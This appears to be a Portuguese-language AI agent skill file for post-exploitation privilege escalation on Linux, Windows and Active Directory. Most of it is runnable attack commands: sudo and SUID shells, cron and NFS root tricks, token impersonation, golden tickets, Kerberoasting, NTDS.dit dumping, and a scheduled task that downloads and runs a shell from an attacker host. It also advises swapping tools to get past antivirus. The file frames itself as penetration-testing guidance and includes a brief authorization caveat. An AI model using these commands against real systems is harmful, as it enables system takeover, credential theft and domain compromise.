---
name: Métodos de Escalação de Privilégios
description: Esta habilidade deve ser usada quando o usuário pede para "escalar privilégios", "obter acesso root", "tornar-se administrador", "técnicas privesc", "explorar sudo", "explorar binários SUID", "Kerberoasting", "pass-the-ticket", "personificação de token" ou precisa de orientação sobre escalação de privilégios em pós-exploração em sistemas Linux ou Windows.
metadata:
  author: zebbern
  version: "1.1"
---

# Métodos de Escalação de Privilégios

## Propósito

Fornecer técnicas abrangentes para escalar privilégios de um usuário com baixos privilégios para acesso root/administrador em sistemas Linux e Windows comprometidos. Essencial para a fase de pós-exploração em testes de penetração e operações de red team.

## Entradas/Pré-requisitos

- Acesso inicial a um shell com baixos privilégios no sistema alvo
- Kali Linux ou distribuição de testes de penetração
- Ferramentas: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus
- Compreensão dos modelos de privilégios no Windows/Linux
- Para ataques em AD: credenciais de usuário de domínio e acesso de rede ao DC

## Saídas/Entregáveis

- Acesso a shell root ou Administrator
- Credenciais e hashes extraídos
- Mecanismos de acesso persistente
- Comprometimento de domínio (para ambientes AD)

---

## Técnicas Principais

### Escalação de Privilégios no Linux

#### 1. Exploração de Binários Sudo

Explorar permissões sudo mal configuradas usando técnicas GTFOBins:

```bash
# Verificar permissões sudo
sudo -l

# Explorar binários comuns
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # depois digite: !bash
sudo man man            # depois digite: !bash
sudo env /bin/bash
```

#### 2. Exploração de Tarefas Agendadas (Cron)

```bash
# Encontrar scripts de cron graváveis
ls -la /etc/cron*
cat /etc/crontab

# Injetar payload em script gravável
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Aguardar execução, depois:
/bin/bash -p
```

#### 3. Exploração de Capabilities

```bash
# Encontrar binários com capabilities
getcap -r / 2>/dev/null

# Python com cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl com cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar com cap_dac_read_search (ler qualquer arquivo)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
```

#### 4. NFS Root Squashing

```bash
# Verificar compartilhamentos NFS
showmount -e <victim_ip>

# Montar e explorar no_root_squash
mkdir /tmp/mount
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```

#### 5. MySQL Executando como Root

```bash
# Se MySQL é executado como root
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

---

### Escalação de Privilégios no Windows

#### 1. Personificação de Token

```powershell
# Usando SweetPotato (SeImpersonatePrivilege)
execute-assembly sweetpotato.exe -p beacon.exe

# Usando SharpImpersonation
SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

#### 2. Exploração de Serviços

```powershell
# Usando PowerUp
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

#### 3. Exploração de SeBackupPrivilege

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

#### 4. Exploração de SeLoadDriverPrivilege

```powershell
# Carregar driver vulnerável Capcom
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
.\ExploitCapcom.exe
```

#### 5. Exploração de GPO

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

---

### Ataques em Active Directory

#### 1. Kerberoasting

```bash
# Usando Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Usando CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
```

#### 2. AS-REP Roasting

```powershell
.\Rubeus.exe asreproast
```

#### 3. Golden Ticket

```powershell
# DCSync para obter hash krbtgt
mimikatz# lsadump::dcsync /user:krbtgt

# Criar golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
```

#### 4. Pass-the-Ticket

```powershell
.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
klist  # Verificar ticket
```

#### 5. Golden Ticket com Tarefas Agendadas

```powershell
# 1. Elevar privilégio e despejar credenciais
mimikatz# token::elevate
mimikatz# vault::cred /patch
mimikatz# lsadump::lsa /patch

# 2. Criar golden ticket
mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi

# 3. Criar tarefa agendada
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
schtasks /run /s DOMAIN /TN "enterprise"
```

---

### Coleta de Credenciais

#### LLMNR Poisoning

```bash
# Iniciar Responder
responder -I eth1 -v

# Criar atalho malicioso (Book.url)
[InternetShortcut]
URL=https://facebook.com
IconIndex=0
IconFile=\\attacker_ip\not_found.ico
```

#### NTLM Relay

```bash
responder -I eth1 -v
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Despejando com VSS

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

---

## Referência Rápida

| Técnica | SO | Domínio Obrigatório | Ferramenta |
|---------|-----|---------------------|-----------|
| Exploração de Binários Sudo | Linux | Não | GTFOBins |
| Exploração de Cron Job | Linux | Não | Manual |
| Exploração de Capabilities | Linux | Não | getcap |
| NFS no_root_squash | Linux | Não | mount |
| Personificação de Token | Windows | Não | SweetPotato |
| Exploração de Serviços | Windows | Não | PowerUp |
| Kerberoasting | Windows | Sim | Rubeus/Impacket |
| AS-REP Roasting | Windows | Sim | Rubeus |
| Golden Ticket | Windows | Sim | Mimikatz |
| Pass-the-Ticket | Windows | Sim | Rubeus |
| DCSync | Windows | Sim | Mimikatz |
| LLMNR Poisoning | Windows | Sim | Responder |

---

## Restrições

**Deve:**
- Ter acesso inicial a shell antes de tentar escalação
- Verificar SO e ambiente do alvo antes de selecionar técnica
- Usar ferramenta apropriada para escalação de domínio vs local

**Não Deve:**
- Tentar técnicas em sistemas de produção sem autorização
- Deixar mecanismos de persistência sem aprovação do cliente
- Ignorar mecanismos de detecção (EDR, SIEM)

**Deveria:**
- Enumerar minuciosamente antes de exploração
- Documentar todos os caminhos de escalação bem-sucedidos
- Limpar artefatos após engajamento

---

## Exemplos

### Exemplo 1: Linux Sudo para Root

```bash
# Verificar permissões sudo
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Explorar vim
$ sudo vim -c ':!/bin/bash'
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Exemplo 2: Windows Kerberoasting

```bash
# Solicitar tickets de serviço
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Quebrar com hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## Solução de Problemas

| Problema | Solução |
|----------|---------|
| sudo -l requer senha | Tentar outra enumeração (SUID, cron, capabilities) |
| Mimikatz bloqueado por AV | Usar Invoke-Mimikatz ou SafetyKatz |
| Kerberoasting retorna sem hashes | Verificar contas de serviço com SPNs |
| Personificação de token falha | Verificar se SeImpersonatePrivilege está presente |
| Montagem NFS falha | Verificar compatibilidade de versão NFS (vers=2,3,4) |

---

## Recursos Adicionais

Para scripts de enumeração detalhados, use:
- **LinPEAS**: Enumeração de escalação de privilégios Linux
- **WinPEAS**: Enumeração de escalação de privilégios Windows
- **BloodHound**: Mapeamento de caminhos de ataque em Active Directory
- **GTFOBins**: Referência de exploração de binários Unix